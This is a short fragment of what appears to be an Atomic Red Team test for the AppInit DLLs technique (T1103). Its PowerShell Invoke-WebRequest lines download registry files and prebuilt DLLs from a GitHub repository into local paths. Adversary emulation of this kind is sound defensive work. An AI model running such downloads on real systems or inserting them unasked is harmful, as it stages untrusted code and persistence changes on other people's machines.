...
Invoke-WebRequest "https://github.com/emrahkaya/atomic-red-team/raw/feature/v6/atomics/T1103/src/T1103.reg" -OutFile "#{registry_file}"
Invoke-WebRequest "https://github.com/emrahkaya/atomic-red-team/raw/feature/v6/atomics/T1103/src/T1103-cleanup.reg" -OutFile "#{registry_cleanup_file}"
```
...
Invoke-WebRequest "https://github.com/emrahkaya/atomic-red-team/raw/feature/v6/atomics/T1103/bin/T1103.dll" -OutFile C:\Tools\T1103.dll
Invoke-WebRequest "https://github.com/emrahkaya/atomic-red-team/raw/feature/v6/atomics/T1103/bin/T1103x86.dll" -OutFile C:\Tools\T1103x86.dll
```
